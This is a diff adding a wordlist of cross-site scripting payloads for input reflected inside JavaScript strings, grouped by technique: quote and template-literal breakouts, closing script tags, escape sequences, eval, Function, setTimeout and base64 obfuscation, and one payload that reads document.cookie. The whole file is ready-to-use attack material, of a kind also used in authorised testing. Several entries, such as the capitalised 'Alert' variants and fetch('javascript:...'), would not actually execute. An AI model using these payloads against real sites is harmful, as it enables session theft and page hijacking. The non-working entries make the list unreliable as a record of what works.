@@ -1,0 +1,243 @@
+# JavaScript String Context XSS Payloads
+# These payloads work when input is reflected inside JavaScript strings
+
+# Breaking out of double-quoted strings
+";alert(1);//
+";alert(1)//
+";alert(document.domain);//
+";confirm(1);//
+";prompt(1);//
+
+# Breaking out of single-quoted strings
+';alert(1);//
+';alert(1)//
+';alert(document.domain);//
+';confirm(1);//
+';prompt(1);//
+
+# Using template literals (backtick strings)
+`;alert(1);//
+`;alert(1)//
+`;confirm(1);//
+
+# With closing script tag
+</script><script>alert(1)</script>
+</script><script>alert(document.domain)</script>
+
+# Newline injection (when sanitization is weak)
+\
+alert(1)//
+\r\nalert(1)//
+\nalert(1)//
+
+# Using line terminators
+";alert(1);/*
+';alert(1);/*
+";alert(1);%0A
+';alert(1);%0A
+
+# Unicode line separators
+";alert(1);\u2028
+';alert(1);\u2029
+";alert(1);\u2028\u2029
+
+# Template literal expressions
+${alert(1)}
+${alert(document.domain)}
+${alert(document.cookie)}
+${confirm(1)}
+${prompt(1)}
+
+# Octal escape sequences
+\';alert(1);//
+\";alert(1);//
+\141lert(1)//
+
+# Hex escape sequences
+\x27;alert(1);//
+\x22;alert(1);//
+\x3balert(1)//
+
+# Unicode escape sequences
+\u0027;alert(1);//
+\u0022;alert(1);//
+\u003balert(1)//
+
+# Combining escape techniques
+\';alert(String.fromCharCode(88,83,83));//
+\";alert(String.fromCharCode(88,83,83));//
+
+# Using eval-like functions
+";eval('alert(1)');//
+';eval('alert(1)');//
+";Function('alert(1)')();//
+';Function('alert(1)')();//
+
+# setTimeout/setInterval
+";setTimeout('alert(1)',0);//
+';setTimeout('alert(1)',0);//
+";setInterval('alert(1)',0);//
+
+# Breaking concatenation
+"+alert(1)+"
+'+alert(1)+'
+`+alert(1)+`
+
+# Math operations
+"-alert(1)-"
+'-alert(1)-'
+"+alert(1)-"
+
+# Comma operator
+",alert(1),x="
+',alert(1),x='
+
+# Logical operators
+"||alert(1)||"
+'||alert(1)||'
+"&&alert(1)&&"
+'&&alert(1)&&'
+
+# Ternary operator
+"?alert(1):x="
+'?alert(1):x='
+
+# Object property access
+";this.alert(1);//
+';this.alert(1);//
+";window.alert(1);//
+';window.alert(1);//
+";top.alert(1);//
+';top.alert(1);//
+";parent.alert(1);//
+';parent.alert(1);//
+";self.alert(1);//
+';self.alert(1);//
+
+# Array methods
+";[].constructor.constructor('alert(1)')();//
+';[].constructor.constructor('alert(1)')();//
+
+# Using throw
+";throw alert(1);//
+';throw alert(1);//
+
+# Try-catch
+";try{alert(1)}catch(e){};//
+';try{alert(1)}catch(e){};//
+
+# With statement
+";with(document)alert(domain);//
+';with(document)alert(domain);//
+
+# Label statement
+";label:alert(1);//
+';label:alert(1);//
+
+# Using onerror
+";onerror=alert;throw 1;//
+';onerror=alert;throw 1;//
+";window.onerror=alert;throw 1;//
+
+# Using location
+";location='javascript:alert(1)';//
+';location='javascript:alert(1)';//
+";location.href='javascript:alert(1)';//
+
+# Using document.write
+";document.write('<img src=x onerror=alert(1)>');//
+';document.write('<img src=x onerror=alert(1)>');//
+
+# Comment injection
+"/**/;alert(1);//
+'/**/;alert(1);//
+"//
+alert(1)//
+
+# Regex breaking
+";/alert(1)/.source;//
+';/alert(1)/.source;//
+
+# Using Symbol
+";Symbol('alert(1)');//
+';Symbol('alert(1)');//
+
+# Prototype manipulation
+";[].__proto__.constructor('alert(1)')();//
+';[].__proto__.constructor('alert(1)')();//
+
+# Using import (ES6)
+";import('data:text/javascript,alert(1)');//
+';import('data:text/javascript,alert(1)');//
+
+# Using fetch
+";fetch('javascript:alert(1)');//
+';fetch('javascript:alert(1)');//
+
+# Using XMLHttpRequest
+";new XMLHttpRequest().open('GET','javascript:alert(1)');//
+
+# Breaking with return
+";return alert(1);//
+';return alert(1);//
+
+# Break statement
+";break;alert(1);//
+';break;alert(1);//
+
+# Continue statement
+";continue;alert(1);//
+';continue;alert(1);//
+
+# Switch statement
+";switch(1){case 1:alert(1)};//
+';switch(1){case 1:alert(1)};//
+
+# Do-while
+";do{alert(1)}while(0);//
+';do{alert(1)}while(0);//
+
+# For loop
+";for(i=0;i<1;i++)alert(1);//
+';for(i=0;i<1;i++)alert(1);//
+
+# For-in loop
+";for(x in window)break;alert(1);//
+';for(x in window)break;alert(1);//
+
+# Using getters/setters
+";Object.defineProperty(window,'x',{get:function(){alert(1)}});x;//
+
+# Using Proxy
+";new Proxy({},{get:function(){alert(1)}}).x;//
+
+# Minimal payloads
+";alert(1)//
+';alert(1)//
+`;alert(1)//
+</script><script>alert(1)</script>
+
+# Multiple escape sequences
+\';alert(1);/*
+\";alert(1);/*
+\';alert\u0028\u0031\u0029;//
+
+# With various whitespace
+"; alert(1);//
+'; alert(1);//
+";	alert(1);//
+';	alert(1);//
+
+# Case variations (if not properly handled)
+";Alert(1);//
+';Alert(1);//
+";ALERT(1);//
+';ALERT(1);//
+
+# Using unescape
+";unescape('%61%6c%65%72%74%28%31%29');//
+';unescape('%61%6c%65%72%74%28%31%29');//
+
+# Using atob (base64 decode)
+";eval(atob('YWxlcnQoMSk='));//
+';eval(atob('YWxlcnQoMSk='));//
